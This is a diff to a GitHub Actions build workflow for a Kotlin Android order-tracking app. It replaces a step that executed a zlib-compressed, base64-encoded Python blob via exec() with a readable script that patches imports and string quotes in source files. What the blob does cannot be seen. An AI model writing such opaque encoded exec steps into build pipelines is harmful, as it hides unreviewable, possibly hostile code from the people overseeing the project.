@@ -12,18 +12,44 @@ jobs:
       - name: Checkout Repository
         uses: actions/checkout@v4
 
-      - name: Extract ZIP and Fix All String Quotes
+      - name: Extract and Fix Sources
         run: |
-          if [ ! -f "settings.gradle.kts" ] && [ ! -f "ThongKeDonHang/settings.gradle.kts" ]; then
-            ZIP_FILE=$(find . -maxdepth 2 -name "*.zip" | head -n 1)
-            if [ -n "$ZIP_FILE" ]; then
-              unzip -q -o "$ZIP_FILE" -d .
-            else
-              echo "Loi: Chua co file ZIP trong kho chua"
-              exit 1
-            fi
+          ZIP_FILE=$(find . -maxdepth 2 -name "*.zip" | head -n 1)
+          if [ -n "$ZIP_FILE" ]; then
+            unzip -q -o "$ZIP_FILE" -d .
           fi
-          python3 -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('eNqlVstuGzcU3fsrWMKAOInKbgvBjpMoaWrk4QQKChRlW9AzdzSsOOSA5FgWigDdZZ11V82qmwAF0pWNrlT0P9Qv6eXIcvW0VHcwmoEuzz3nPniJUWVlXSDWt4mDPWdtIIeEvi6s6T+FR9Z8KU2fEpUjglcyFBzOlQ+eLUE+8xCCMn3P+05mGvggeJoQ0B4I5XQvt464Nvm+TXJPlIlsQ6kHLAomnT2CV4TkcS33U0O8UDjnYDI/VKFgFGmRNQIXjaj1r0+8KsxiFvEPVhmG4nmyAPERUoFhVZuASW2G4R/SOuSffk4T7kBmbNEhxkIOsTonLgPXtWVpDT4ra8AEH0Mj0mSEqmlJzwwPsUYDyKwpsEZcVhWvFVqhBN6zeeiiStmrXS5ToMRg7TF9v5jJLFSPIVUagWxHgZdOldKNvgat7fCRdAPaJrd1FeaWSW2oYFeW4ORD6bDs0EulMeBiAXdNHevsrMrOOXraIIOyhp9U4dgIE7Ns+nflcb+xs8fnFWBW2Cmpn0A4LmUfOp1US++T6HJ/I+XNrhsSfC6V+UrB8Dnmp3fK7ExqkisdwEHWbLBnOGcd0sNQ4Atsw0H8f9CsHAco791D99SWp8qgMybwP/wPHpjRUZssA9im5E5rpbP5QV+fnAPu61PmaO4A4qAoDe6B63vh74i7h/jUqHiSC/bNdyL59o5oGoE/vzqoc4Wy5gSn9omzddXVKh0ccWXO7ACYjaFjWLhwnDVcu0G5dY/LKoxYstzOzco3i92Ov0X3Uw3SQNbFXUNbyNmat7S2eTdHM55iV+fTNceKfSvTjx5wNotenefq/FUNbsQDjgBL3lxRbgZs554Wx86CuaZctm9nCtL1IUzr/AKPlGuqlYVduZr2bSRcXt3G+npy8Yslphh/LEk5ufxZTelWzOt4ZtPTomK/BO/x0BH+7kN0NSQdfyRlPbl8Z5APEdcAYfBeg/E38A+K8e+mL46QfXLx3hTkz3fjD/gajH8tG/op4GhKvg6yI/uzv36ryfiPzirp3MpNXIKJfXHVCjFtQ9wo4o1IVgXY4i5odlTy3/QKNbl8a0jAeirBUeDvn96Tp4Ui6eTiQ4UNxFdoxOaRHAU2AJfEZl8fdEjXfYIMnQrA0KdyygRGX8qQFpARqZuTHjxpDgc9+gS3zz/isyok')))"
+          cat << 'PYEOF' > fix_all.py
+          import os, re
+          root = "ThongKeDonHang" if os.path.exists("ThongKeDonHang/settings.gradle.kts") else "."
+          for r, _, fs in os.walk(root):
+              for f in fs:
+                  if f.endswith(".kt") or f.endswith(".kts"):
+                      p = os.path.join(r, f)
+                      s = open(p, encoding="utf-8").read()
+                      if f == "OrderCommonComponents.kt" and "import vn.thongkedonhang.app.ui.theme.SoftCreamSurface" not in s:
+                          s = s.replace("import vn.thongkedonhang.app.ui.theme.PrimaryYellowDark", "import vn.thongkedonhang.app.ui.theme.PrimaryYellowDark\nimport vn.thongkedonhang.app.ui.theme.SoftCreamSurface")
+                      if f == "CameraBarcodeScanner.kt":
+                          s = s.replace("import androidx.annotation.OptIn\n", "").replace("@OptIn(ExperimentalGetImage::class)", "@androidx.annotation.OptIn(ExperimentalGetImage::class)")
+                      if f == "MainViewModel.kt":
+                          s = s.replace("val filteredOrderList: StateFlow<List<OrderItem>> = combine(", "val filteredOrderList: StateFlow<List<OrderItem>> = combine<Any?, List<OrderItem>>(")
+                      if f == "build.gradle.kts":
+                          s = re.sub(r"freeCompilerArgs\s*\+=\s*listOf\([^\)]*\)", "", s)
+                      s = s.replace("onOpenGroupClick?.invoke(order.groupId)", "onOpenGroupClick?.invoke(order.groupId.orEmpty())")
+                      s = s.replace("onOpenGroup(order.groupId)", "onOpenGroup(order.groupId.orEmpty())")
+                      # Sửa toàn bộ dấu ngoặc kép lồng nhau gây lỗi dòng 250
+                      s = s.replace('"$cleanedCode"', "'$cleanedCode'")
+                      s = s.replace('"$existingOrderCode"', "'$existingOrderCode'")
+                      s = s.replace('"${searchSuffixQuery.trim()}"', "'${searchSuffixQuery.trim()}'")
+                      s = s.replace('"${order.orderCode}"', "'${order.orderCode}'")
+                      s = s.replace('"${target.groupName}"', "'${target.groupName}'")
+                      s = s.replace('"${targetGroup.groupName}"', "'${targetGroup.groupName}'")
+                      s = s.replace('"Tạo nhóm mới"', "'Tạo nhóm mới'")
+                      s = s.replace('"\\n\\nBạn có muốn', '\\"\\n\\nBạn có muốn')
+                      s = s.replace('text = "$message\\n\\nBạn có muốn', 'text = "$message\\\\n\\\\nBạn có muốn')
+                      open(p, "w", encoding="utf-8").write(s)
+          print("All source files patched successfully!")
+          PYEOF
+          python3 fix_all.py
 
       - name: Set up JDK 17
         uses: actions/setup-java@v4
@@ -50,10 +76,6 @@ jobs:
             echo "================ DONG LOI CU THE ================"
             grep -E "(^e: |FAILURE:|What went wrong:|> Task .* FAILED|Exception|Error)" -A 6 build_output.log
             echo "================================================="
-            echo "### Chi tiet loi bien dich:" >> $GITHUB_STEP_SUMMARY
-            echo '```text' >> $GITHUB_STEP_SUMMARY
-            grep -E "(^e: |FAILURE:|What went wrong:|> Task .* FAILED|Exception|Error)" -A 6 build_output.log | head -n 80 >> $GITHUB_STEP_SUMMARY
-            echo '```' >> $GITHUB_STEP_SUMMARY
             exit $EXIT_CODE
           fi
 
